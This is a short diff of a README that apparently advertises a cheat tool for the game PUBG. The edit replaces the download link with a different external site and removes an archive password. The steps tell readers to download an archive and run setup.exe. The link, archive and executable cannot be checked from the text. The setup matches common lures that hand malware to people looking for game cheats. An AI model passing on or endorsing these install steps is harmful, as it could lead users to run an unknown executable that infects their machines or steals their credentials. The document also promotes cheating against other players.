@@ -7,8 +7,8 @@ giving you an unparalleled advantage over opponents!
 
 <H3>How to install pubg Hack:</H3>
 
-- [Download](https://goo.su/x7Yrj)
-- Open archive (password: Project12!)
+- [Download](https://softspace.space)
+- Open archive
 - Open setup.exe for download components and install
 - Follow the instruction
 
